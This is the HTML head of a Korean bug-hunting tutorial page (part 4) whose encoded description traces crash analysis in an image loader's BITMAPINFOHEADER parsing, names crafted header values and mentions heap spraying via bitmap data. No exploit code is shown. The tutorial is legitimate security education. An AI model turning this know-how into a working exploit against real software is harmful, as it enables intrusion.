

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/&#34;&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC; Part 3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC5B4;&amp;#xB290;&amp;#xB367; &amp;#xBC84;&amp;#xADF8;&amp;#xD5CC;&amp;#xD305; &amp;#xD29C;&amp;#xD1A0;&amp;#xB9AC;&amp;#xC5BC;&amp;#xC758; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xAE00;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Part 3 &amp;#xC5D0;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC774;&amp;#xB2C8; &amp;#xAE34;&amp;#xB9D0; &amp;#xC5C6;&amp;#xC774; &amp;#xBC14;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD574;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD574;&amp;#xBCFC; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC5B4;&amp;#xB290; &amp;#xC815;&amp;#xB3C4;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBD10;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xAC00; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC78; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xC5B4;&amp;#xB290; &amp;#xBD80;&amp;#xBD84;&amp;#xBD80;&amp;#xD130; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &amp;#xC88B;&amp;#xC744;&amp;#xC9C0;&amp;#xB97C; &amp;#xD310;&amp;#xB2E8;&amp;#xD560; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95; &amp;#xC5ED;&amp;#xC2DC; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xB85C;(&amp;#xD0D1;&amp;#xB2E4;&amp;#xC6B4;) &amp;#xC544;&amp;#xB798;&amp;#xC5D0;&amp;#xC11C; &amp;#xC704;&amp;#xB85C;(&amp;#xBC14;&amp;#xD140;&amp;#xC5C5;) &amp;#xBB58; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xD558;&amp;#xB358; &amp;#xC0C1;&amp;#xAD00;&amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB0E5; &amp;#xC790;&amp;#xC2E0;&amp;#xC774; &amp;#xD3B8;&amp;#xD558;&amp;#xC2E0; &amp;#xB300;&amp;#xB85C; &amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC14;&amp;#xD140;&amp;#xC5C5; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD560; &amp;#xB54C;&amp;#xC5D0;&amp;#xB294; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xCC98;&amp;#xC74C; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xBE0C;&amp;#xB808;&amp;#xC774;&amp;#xD06C; &amp;#xD3EC;&amp;#xC778;&amp;#xD2B8;&amp;#xB97C; &amp;#xAC78;&amp;#xC5B4;&amp;#xC11C; &amp;#xBC14;&amp;#xB85C; &amp;#xC9C1;&amp;#xC804;&amp;#xC758; &amp;#xB9AC;&amp;#xD134; &amp;#xC5B4;&amp;#xB4DC;&amp;#xB808;&amp;#xC2A4;&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xD558;&amp;#xB098;&amp;#xD558;&amp;#xB098; &amp;#xC62C;&amp;#xB77C;&amp;#xAC00;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0D1;&amp;#xB2E4;&amp;#xC6B4; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD560; &amp;#xACBD;&amp;#xC6B0; &amp;#xB3D9;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xACFC; &amp;#xC815;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xC801;&amp;#xC808;&amp;#xD788; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xB2E8; &amp;#xC81C;&amp;#xC77C; &amp;#xC704;(&amp;#xB77C;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;)&amp;#xC5D0; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xBCF4;&amp;#xACE0; &amp;#xBA3C;&amp;#xC800; &amp;#xC815;&amp;#xC801; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xACB0;&amp;#xACFC;&amp;#xB4E4;&amp;#xC744; &amp;#xAE30;&amp;#xBC18;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC801; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xAC19;&amp;#xC774; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB098;&amp;#xB294; &amp;#xC544;&amp;#xBB34; &amp;#xC0DD;&amp;#xAC01;&amp;#xC774; &amp;#xC5C6;&amp;#xB2E4;!!! &amp;#xADF8;&amp;#xB0E5; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC744; &amp;#xCD5C;&amp;#xB300;&amp;#xD55C; &amp;#xC904;&amp;#xC774;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5B4;&amp;#xC694;!!! &amp;#xC2DC;&amp;#xAC04;&amp;#xC740; &amp;#xB9CE;&amp;#xC544;&amp;#xC694;!!!(&amp;#xB294; &amp;#xAC1C;&amp;#xBFD4; &amp;#xC81C;&amp;#xB85C;&amp;#xB370;&amp;#xC774;&amp;#xB294; &amp;#xBB35;&amp;#xD788;&amp;#xBA74; &amp;#xB625; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;)&amp;#xB77C;&amp;#xACE0; &amp;#xD558;&amp;#xC2DC;&amp;#xB294; &amp;#xBD84;&amp;#xB4E4;&amp;#xC740; &amp;#xADF8;&amp;#xB0E5; &amp;#xC81C;&amp;#xC77C; &amp;#xC704;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; p &amp;#xB204;&amp;#xB974;&amp;#xACE0; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC; &amp;#xD130;&amp;#xC9C0;&amp;#xBA74; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8; &amp;#xC7AC;&amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xACE0; &amp;#xADF8; &amp;#xC2DC;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; &amp;#xAC00;&amp;#xC11C; &amp;#xB2E4;&amp;#xC2DC; p &amp;#xB204;&amp;#xB974;&amp;#xACE0;&amp;#x2026; &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xCB49;&amp;#xCB49; &amp;#xB0B4;&amp;#xB824;&amp;#xAC00;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xB3C4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB34;&amp;#xC2DD;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xD655;&amp;#xC2E4;&amp;#xD558;&amp;#xAE30;&amp;#xB3C4; &amp;#xD558;&amp;#xC8E0;&amp;#x2026;. &amp;#xB294; &amp;#xC2DC;&amp;#xAC04; &amp;#xB0AD;&amp;#xBE44; &amp;#xAC1C;&amp;#xCA54;&amp;#x2026; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xC798;&amp;#xBABB; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &amp;#xB9AC;&amp;#xC5BC; &amp;#xC2DC;&amp;#xAC04; &amp;#xB0AD;&amp;#xBE44;&amp;#x2026; (&amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xB294; &amp;#xD799;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xC2A4;&amp;#xB798;&amp;#xB4DC;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xD799;&amp;#xC5D0;&amp;#xC11C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xBA74; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xB9D0;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; &amp;#xBB50; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC774;&amp;#xAC83;&amp;#xB9CC;&amp;#xD07C; &amp;#xC0DD;&amp;#xAC01; &amp;#xC5C6;&amp;#xC774; &amp;#xD558;&amp;#xB294; &amp;#xAC74; &amp;#xC5C6;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xB124;&amp;#xC6AC;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B;&amp;#x314B; (&amp;#xC9C0;&amp;#xADF9;&amp;#xD788; &amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xBCF5;&amp;#xAD6C;&amp;#xC5D0;&amp;#xB9CC; &amp;#xD574;&amp;#xB2F9;&amp;#xB418;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xACB0;&amp;#xAD6D;&amp;#xC740; &amp;#xB2E4; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xC57C; &amp;#xB3FC;&amp;#xC694; &amp;#x3160;&amp;#x3160;)&lt;/p&gt;
&lt;p&gt;&amp;#xCF5C; &amp;#xC2A4;&amp;#xD0DD;&amp;#xC744; &amp;#xBCF5;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xCC9C;&amp;#xCC9C;&amp;#xD788; &amp;#xB530;&amp;#xB77C;&amp;#xB2E4;&amp;#xAC00; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;ImLoader+0x27BB0&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD5E4;&amp;#xB354; &amp;#xAC80;&amp;#xC0AC;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBC1C;&amp;#xACAC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xCEA1;&amp;#xCC98; &amp;#xC0AC;&amp;#xC9C4;&amp;#xC758; &amp;#xD5E5;&amp;#xC2A4;&amp;#xB808;&amp;#xC774; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xC544;&amp;#xC774;&amp;#xB2E4; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xC870;&amp;#xAE08;&amp;#xC529; &amp;#xB2E4;&amp;#xB97C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png&#34; alt=&#34;bughunting-tutorials-part4/image--048.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v7&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xAC12;&amp;#xC774; &lt;code&gt;MB&lt;/code&gt;(&amp;#xC22B;&amp;#xC790;&amp;#xB85C; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &amp;#xBABB; &amp;#xCC3E;&amp;#xC740; &amp;#xAC70;&amp;#xB124;&amp;#xC694;)&amp;#xC778;&amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xACE0; &amp;#xD2C0;&amp;#xB9AC;&amp;#xBA74; &amp;#xC775;&amp;#xC149;&amp;#xC158;&amp;#xC744; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xB9DE;&amp;#xB2E4;&amp;#xBA74; &amp;#xD574;&amp;#xC11D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;sub_427620&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C; &amp;#xD574;&amp;#xC11D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACA0;&amp;#xB124;&amp;#xC694;!!&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C;&amp;#xBD80;&amp;#xD130;&amp;#xB294; &amp;#xC2E4;&amp;#xC81C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC9C4;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--050.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xC5B4; &amp;#xC628; Stream &amp;#xAC12;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC758; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640;&amp;#xC11C; &amp;#xC9C0;&amp;#xC5ED;&amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7FC; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC218;&amp;#xC815;&amp;#xD55C; &lt;code&gt;0x1f28&lt;/code&gt; &amp;#xC774;&amp;#xACA0;&amp;#xC8E0;? &amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;0x1f28+0x40c&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD574;&amp;#xC8FC;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; header&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;size&lt;/code&gt; &amp;#xC640; &lt;code&gt;0xc&lt;/code&gt; &amp;#xAC00; &amp;#xAC19;&amp;#xC740; &amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xB97C; &amp;#xD574;&amp;#xC11C; &amp;#xACB0;&amp;#xACFC; &amp;#xAC12;&amp;#xC744; &lt;code&gt;size_bool&lt;/code&gt; &amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB54C; &lt;code&gt;size&lt;/code&gt; &amp;#xB294; &lt;code&gt;0x1f28&lt;/code&gt; &amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;size_bool&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; 0 &amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xBC11;&amp;#xC5D0; &amp;#xBD84;&amp;#xAE30;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;size_bool&lt;/code&gt; &amp;#xC774; &lt;code&gt;0&lt;/code&gt; &amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBE60;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png&#34; alt=&#34;bughunting-tutorials-part4/image--052.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBE60;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC2DC;&amp;#xC791; &amp;#xBD80;&amp;#xBD84;&amp;#xBD80;&amp;#xD130; &lt;code&gt;size&lt;/code&gt;&amp;#xB9CC;&amp;#xD07C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC640;&amp;#xC11C; header&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC55E;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;size+0x40c&lt;/code&gt; &amp;#xB9CC;&amp;#xD07C; &amp;#xD560;&amp;#xB2F9;&amp;#xC744; &amp;#xD588;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7F0; &amp;#xB2E4;&amp;#xC74C;, compression&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xBD84;&amp;#xAE30;&amp;#xBB38;&amp;#xC744; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xAC12;&amp;#xC740; &lt;code&gt;0x00&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C; &lt;code&gt;0xa00&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC218;&amp;#xC815;&amp;#xD588;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC08; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB85C; &amp;#xD558;&amp;#xB294; &amp;#xC77C;&amp;#xC774; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7FC; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xB4B7;&amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.(&lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xAC00; &amp;#xD398;&amp;#xC774;&amp;#xC9C0;&amp;#xB97C; &amp;#xD558;&amp;#xB098; &amp;#xB354; &amp;#xD560;&amp;#xB2F9;&amp;#xD560; &amp;#xB9CC;&amp;#xD07C; &amp;#xD06C;&amp;#xC9C8; &amp;#xC54A;&amp;#xC73C;&amp;#xB2C8;) &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC911;&amp;#xC694;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;!!! &amp;#xC65C;&amp;#xB0D0;&amp;#xD558;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xB36E;&amp;#xAC8C; &amp;#xB420; &amp;#xAC1D;&amp;#xCCB4;&amp;#xB2C8;&amp;#xAE4C;&amp;#xC694; &amp;#x314E;&amp;#x314E;(&amp;#xC751;? &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt;&amp;#xB4A4;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C;&amp;#xB2E4;&amp;#xBA70;&amp;#x2026; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0; &amp;#xC548; &amp;#xB09C;&amp;#xB2E4;&amp;#xBA70;&amp;#x2026;.)&lt;/p&gt;
&lt;p&gt;&amp;#xB4A4;&amp;#xC5D0; &amp;#xB354; &amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xC8E0; &amp;#x314E;&amp;#x314E;&amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--054.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xB294; &lt;code&gt;this&lt;/code&gt; &amp;#xC5D0; &lt;code&gt;BITMAPINFOHEADER&lt;/code&gt; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCC38; &amp;#xCC30;&amp;#xC9C0;&amp;#xAC8C; &amp;#xB2E4; &amp;#xB123;&amp;#xB124;&amp;#xC694;.&lt;br&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC5D0;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xD560; &amp;#xB54C; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg&#34; alt=&#34;bughunting-tutorials-part4/image--056.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD80;&amp;#xBD84;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;&amp;#x314E; &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#x314E;&amp;#x314E;&lt;/p&gt;
